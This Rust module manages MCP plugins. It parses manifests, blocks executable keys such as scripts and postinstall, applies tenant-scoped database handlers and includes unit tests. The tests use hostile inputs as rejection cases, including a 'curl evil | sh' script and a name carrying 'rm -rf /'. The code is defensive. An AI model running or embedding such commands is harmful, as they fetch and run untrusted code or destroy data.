//! 插件（kind = mcp）。
//!
//! v1 的插件只有一种形态：一份声明式清单 + 一台 MCP server 的建连配置。
//! 内置插件用 Rust 实现，但同样以 MCP 工具的形式暴露，因此插件列表里
//! 只有"元数据 + 指向 mcp_server"的差别，Agent 侧看到的永远是工具。

use std::{collections::BTreeMap, sync::Arc};

use axum::{
    extract::{rejection::JsonRejection, Extension, Path, State},
    response::Response,
    Json,
};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sqlx::FromRow;
use uuid::Uuid;

use crate::{
    auth::CurrentUser,
    error::{ApiResult, AppError},
    integration::{audit, is_admin, ok},
    state::AppState,
};

use super::mcp::{string_list, McpServerSpec, TransportKind};

/// 插件清单里我们接受的字段。多一个字段就多一条攻击面，因此白名单收口。
#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
pub struct PluginManifest {
    pub name: String,
    #[serde(default)]
    pub version: Option<String>,
    /// 只接受 `mcp`：脚本型插件没有沙箱边界，不做。
    pub kind: String,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub mcp: Option<McpManifestConfig>,
    /// 允许暴露的工具（空 = 全部）。
    #[serde(default)]
    pub tools: Vec<String>,
    /// 声明式权限名，仅用于展示/审计，不授予任何能力。
    #[serde(default)]
    pub permissions: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
pub struct McpManifestConfig {
    #[serde(default)]
    pub transport: Option<String>,
    #[serde(default)]
    pub command: Option<String>,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub env: BTreeMap<String, String>,
    #[serde(default)]
    pub url: Option<String>,
    #[serde(default)]
    pub headers: BTreeMap<String, String>,
}

impl McpManifestConfig {
    pub fn into_spec(self, name: &str) -> ApiResult<McpServerSpec> {
        let transport = TransportKind::parse(self.transport.as_deref().unwrap_or("stdio"))
            .ok_or_else(|| {
                AppError::bad_request("plugin mcp transport must be stdio, sse or http")
            })?;
        Ok(McpServerSpec {
            name: name.to_string(),
            transport,
            command: self.command.unwrap_or_default().trim().to_string(),
            args: self.args,
            env: self.env,
            url: self.url.unwrap_or_default().trim().to_string(),
            headers: self.headers,
            framing: super::mcp::Framing::Ndjson,
            tool_allowlist: Vec::new(),
        })
    }
}

/// 明确拒绝的清单字段（写出"看起来能执行"的声明只会骗人）。
const FORBIDDEN_MANIFEST_KEYS: &[&str] = &[
    "scripts",
    "hooks",
    "postinstall",
    "preinstall",
    "exec",
    "command_hook",
    "entrypoint",
];

impl PluginManifest {
    /// 解析 + 校验。`raw` 必须是我们认识的字段集合。
    pub fn parse(raw: &Value) -> ApiResult<Self> {
        let object = raw
            .as_object()
            .ok_or_else(|| AppError::bad_request("plugin manifest must be an object"))?;
        for key in object.keys() {
            if FORBIDDEN_MANIFEST_KEYS
                .iter()
                .any(|blocked| key.eq_ignore_ascii_case(blocked))
            {
                return Err(AppError::bad_request(format!(
                    "plugin manifest key `{key}` is not supported"
                )));
            }
        }
        let manifest: Self = serde_json::from_value(raw.clone())
            .map_err(|e| AppError::bad_request(format!("invalid plugin manifest: {e}")))?;
        manifest.validate()?;
        Ok(manifest)
    }

    pub fn validate(&self) -> ApiResult<()> {
        if !self.kind.trim().eq_ignore_ascii_case("mcp") {
            return Err(AppError::bad_request("plugin kind must be mcp"));
        }
        let name = self.name.trim();
        if name.is_empty() || name.chars().count() > 64 {
            return Err(AppError::bad_request("plugin name must be 1..=64 chars"));
        }
        if !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ' '))
        {
            return Err(AppError::bad_request(
                "plugin name may only contain letters, digits, space, dot, dash, underscore",
            ));
        }
        if let Some(version) = &self.version {
            if !is_version_like(version) {
                return Err(AppError::bad_request("plugin version must look like 1.2.3"));
            }
        }
        if self.tools.len() > super::mcp::schema::MAX_TOOLS {
            return Err(AppError::bad_request("plugin declares too many tools"));
        }
        if self.permissions.len() > 32 {
            return Err(AppError::bad_request(
                "plugin declares too many permissions",
            ));
        }
        if self.mcp.is_none() {
            return Err(AppError::bad_request(
                "plugin manifest must declare an mcp server config",
            ));
        }
        Ok(())
    }
}

fn is_version_like(raw: &str) -> bool {
    let raw = raw.trim();
    if raw.is_empty() || raw.len() > 32 {
        return false;
    }
    // 形如 `1.2.3` / `0.1.0-beta`：首段纯数字，整体只含字母数字与 . - +。
    raw.chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+'))
        && !raw.split('.').any(|part| part.is_empty())
        && raw.chars().next().is_some_and(|c| c.is_ascii_digit())
}

#[derive(Debug, Clone, FromRow, Serialize)]
pub struct PluginRow {
    pub id: Uuid,
    pub tenant_id: i16,
    pub owner_user_id: Option<Uuid>,
    pub name: String,
    pub kind: String,
    pub version: String,
    pub source: String,
    pub builtin: bool,
    pub mcp_server_id: Option<Uuid>,
    pub manifest: Value,
    pub enabled: bool,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

pub const PLUGIN_COLUMNS: &str = "id, tenant_id, owner_user_id, name, kind, version, source, \
     builtin, mcp_server_id, manifest, enabled, created_at, updated_at";

impl PluginRow {
    /// 插件只暴露清单里点名的工具（空 = 全部）。
    pub fn allows_tool(&self, tool: &str) -> bool {
        let allowed: Vec<String> = self
            .manifest
            .get("tools")
            .map(string_list)
            .unwrap_or_default();
        allowed.is_empty() || allowed.iter().any(|t| t == tool)
    }
}

#[derive(Debug, Deserialize)]
pub struct CreatePluginBody {
    pub manifest: Value,
    /// 复用已有 server；缺省则用 manifest 里的 mcp 配置新建。
    #[serde(default)]
    pub mcp_server_id: Option<Uuid>,
    #[serde(default)]
    pub shared: Option<bool>,
    #[serde(default)]
    pub enabled: Option<bool>,
}

#[derive(Debug, Deserialize)]
pub struct PatchPluginBody {
    #[serde(default)]
    pub enabled: Option<bool>,
    #[serde(default)]
    pub tools: Option<Vec<String>>,
}

pub async fn list_plugins(
    State(state): State<Arc<AppState>>,
    Extension(actor): Extension<CurrentUser>,
) -> ApiResult<Response> {
    let admin = is_admin(&actor);
    let rows = sqlx::query_as::<_, PluginRow>(&format!(
        "SELECT {PLUGIN_COLUMNS} FROM plugins \
         WHERE tenant_id = $1 AND ($2::bool OR owner_user_id IS NULL OR owner_user_id = $3) \
         ORDER BY name ASC"
    ))
    .bind(actor.tenant_id)
    .bind(admin)
    .bind(actor.id)
    .fetch_all(&state.db())
    .await?;
    Ok(ok(json!({ "plugins": rows })))
}

pub async fn create_plugin(
    State(state): State<Arc<AppState>>,
    Extension(actor): Extension<CurrentUser>,
    body: Result<Json<CreatePluginBody>, JsonRejection>,
) -> ApiResult<Response> {
    let Json(body) = body.map_err(AppError::invalid_body)?;
    if !state.cfg.integration.enabled {
        return Err(AppError::forbidden("integration features are disabled"));
    }
    let manifest = PluginManifest::parse(&body.manifest)?;
    let shared = body.shared.unwrap_or(false);
    if shared && !is_admin(&actor) {
        return Err(AppError::forbidden(
            "only owner/admin can create shared plugins",
        ));
    }
    let owner: Option<Uuid> = if shared { None } else { Some(actor.id) };

    // 1) 工具面：复用已有 server，或按清单新建一台。
    let server_id = match body.mcp_server_id {
        Some(id) => {
            let exists: Option<(Uuid,)> =
                sqlx::query_as("SELECT id FROM mcp_servers WHERE id = $1 AND tenant_id = $2")
                    .bind(id)
                    .bind(actor.tenant_id)
                    .fetch_optional(&state.db())
                    .await?;
            if exists.is_none() {
                return Err(AppError::not_found("mcp server not found"));
            }
            Some(id)
        }
        None => {
            let config = manifest
                .mcp
                .clone()
                .ok_or_else(|| AppError::bad_request("plugin has no mcp config"))?;
            let spec = config.into_spec(&manifest.name)?;
            spec.validate(&state.cfg.integration)?;
            spec.check_network(&state.cfg.integration).await?;
            let row: (Uuid,) = sqlx::query_as(
                "INSERT INTO mcp_servers \
                   (tenant_id, owner_user_id, name, transport, command, args, env, url, headers) \
                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id",
            )
            .bind(actor.tenant_id)
            .bind(owner)
            .bind(&spec.name)
            .bind(spec.transport.as_str())
            .bind(&spec.command)
            .bind(json!(spec.args))
            .bind(json!(spec.env))
            .bind(&spec.url)
            .bind(json!(spec.headers))
            .fetch_one(&state.db())
            .await
            .map_err(|e| unique_or(e, "an mcp server with this plugin name already exists"))?;
            Some(row.0)
        }
    };

    // 2) 插件行。
    let manifest_value = serde_json::to_value(&manifest)
        .map_err(|e| AppError::internal(format!("manifest serialize failed: {e}")))?;
    let row = sqlx::query_as::<_, PluginRow>(&format!(
        "INSERT INTO plugins \
           (tenant_id, owner_user_id, name, kind, version, source, mcp_server_id, manifest, enabled) \
         VALUES ($1, $2, $3, 'mcp', $4, 'local', $5, $6, $7) \
         RETURNING {PLUGIN_COLUMNS}"
    ))
    .bind(actor.tenant_id)
    .bind(owner)
    .bind(manifest.name.trim())
    .bind(manifest.version.clone().unwrap_or_else(|| "0.0.0".into()))
    .bind(server_id)
    .bind(&manifest_value)
    .bind(body.enabled.unwrap_or(true))
    .fetch_one(&state.db())
    .await
    .map_err(|e| unique_or(e, "a plugin with this name already exists in scope"))?;

    audit(
        &state,
        &actor,
        "plugin.create",
        &row.name,
        &format!("server={server_id:?}"),
    )
    .await;
    Ok(ok(json!(row)))
}

/// 启用/禁用 + 工具白名单（白名单存回 manifest.tools）。
pub async fn patch_plugin(
    State(state): State<Arc<AppState>>,
    Extension(actor): Extension<CurrentUser>,
    Path(id): Path<Uuid>,
    body: Result<Json<PatchPluginBody>, JsonRejection>,
) -> ApiResult<Response> {
    let Json(body) = body.map_err(AppError::invalid_body)?;
    let existing = load_plugin(&state, &actor, id).await?;
    super::ensure_can_modify(&actor, existing.owner_user_id)?;
    let mut manifest = existing.manifest.clone();
    if let Some(tools) = body.tools {
        if tools.len() > super::mcp::schema::MAX_TOOLS {
            return Err(AppError::bad_request("too many tools in allowlist"));
        }
        if let Some(object) = manifest.as_object_mut() {
            object.insert("tools".into(), json!(tools));
        }
    }
    let row = sqlx::query_as::<_, PluginRow>(&format!(
        "UPDATE plugins SET enabled = $2, manifest = $3, updated_at = now() \
         WHERE id = $1 AND tenant_id = $4 RETURNING {PLUGIN_COLUMNS}"
    ))
    .bind(id)
    .bind(body.enabled.unwrap_or(existing.enabled))
    .bind(&manifest)
    .bind(actor.tenant_id)
    .fetch_one(&state.db())
    .await?;

    audit(
        &state,
        &actor,
        "plugin.update",
        &row.name,
        if row.enabled { "enabled" } else { "disabled" },
    )
    .await;
    Ok(ok(json!(row)))
}

pub async fn delete_plugin(
    State(state): State<Arc<AppState>>,
    Extension(actor): Extension<CurrentUser>,
    Path(id): Path<Uuid>,
) -> ApiResult<Response> {
    let existing = load_plugin(&state, &actor, id).await?;
    super::ensure_can_modify(&actor, existing.owner_user_id)?;
    sqlx::query("DELETE FROM plugins WHERE id = $1 AND tenant_id = $2")
        .bind(id)
        .bind(actor.tenant_id)
        .execute(&state.db())
        .await?;
    audit(&state, &actor, "plugin.delete", &existing.name, "").await;
    Ok(ok(json!({ "id": id })))
}

async fn load_plugin(state: &AppState, actor: &CurrentUser, id: Uuid) -> ApiResult<PluginRow> {
    let admin = is_admin(actor);
    sqlx::query_as::<_, PluginRow>(&format!(
        "SELECT {PLUGIN_COLUMNS} FROM plugins \
         WHERE id = $1 AND tenant_id = $2 AND ($3::bool OR owner_user_id IS NULL OR owner_user_id = $4)"
    ))
    .bind(id)
    .bind(actor.tenant_id)
    .bind(admin)
    .bind(actor.id)
    .fetch_optional(&state.db())
    .await?
    .ok_or_else(|| AppError::not_found("plugin not found"))
}

pub(crate) fn unique_or(err: sqlx::Error, message: &str) -> AppError {
    if let sqlx::Error::Database(db) = &err {
        if db.code().as_deref() == Some("23505") {
            return AppError::conflict(message.to_string());
        }
    }
    err.into()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest() -> Value {
        json!({
            "name": "fs-tools",
            "version": "1.2.3",
            "kind": "mcp",
            "description": "file helpers",
            "mcp": {"transport": "stdio", "command": "npx", "args": ["-y", "@mcp/fs"]},
            "tools": ["read", "write"],
            "permissions": ["fs:read"]
        })
    }

    #[test]
    fn parses_a_minimal_mcp_plugin() {
        let parsed = PluginManifest::parse(&manifest()).unwrap();
        assert_eq!(parsed.name, "fs-tools");
        assert_eq!(parsed.tools, vec!["read", "write"]);
        let spec = parsed.mcp.clone().unwrap().into_spec("fs-tools").unwrap();
        assert_eq!(spec.transport, TransportKind::Stdio);
        assert_eq!(spec.command, "npx");
        assert_eq!(spec.args, vec!["-y", "@mcp/fs"]);
    }

    #[test]
    fn rejects_non_mcp_kind_and_script_fields() {
        let mut bad = manifest();
        bad["kind"] = json!("python");
        assert!(PluginManifest::parse(&bad).is_err());

        let mut scripted = manifest();
        scripted["scripts"] = json!({"run": "curl evil | sh"});
        let err = PluginManifest::parse(&scripted).unwrap_err();
        assert!(err.message.contains("not supported"));

        let mut hooked = manifest();
        hooked["HOOKS"] = json!([]);
        assert!(PluginManifest::parse(&hooked).is_err());
    }

    #[test]
    fn rejects_bad_names_versions_and_missing_mcp() {
        let mut bad = manifest();
        bad["name"] = json!("a; rm -rf /");
        assert!(PluginManifest::parse(&bad).is_err());

        let mut bad = manifest();
        bad["version"] = json!("latest");
        assert!(PluginManifest::parse(&bad).is_err());

        let mut bad = manifest();
        bad["mcp"] = Value::Null;
        assert!(PluginManifest::parse(&bad).is_err());

        assert!(PluginManifest::parse(&json!([1, 2])).is_err());
    }

    #[test]
    fn allowlist_filters_tools() {
        let row = PluginRow {
            id: Uuid::nil(),
            tenant_id: 1,
            owner_user_id: None,
            name: "p".into(),
            kind: "mcp".into(),
            version: "1.0.0".into(),
            source: "local".into(),
            builtin: false,
            mcp_server_id: None,
            manifest: manifest(),
            enabled: true,
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        assert!(row.allows_tool("read"));
        assert!(!row.allows_tool("shell"));

        let empty = PluginRow {
            manifest: json!({}),
            ..row
        };
        assert!(empty.allows_tool("anything"));
    }

    #[test]
    fn version_check_is_strict_but_tolerant_of_prerelease() {
        assert!(is_version_like("1.2.3"));
        assert!(is_version_like("0.1.0-beta"));
        assert!(!is_version_like("v1.2.3"));
        assert!(!is_version_like("1..3"));
        assert!(!is_version_like(""));
    }
}
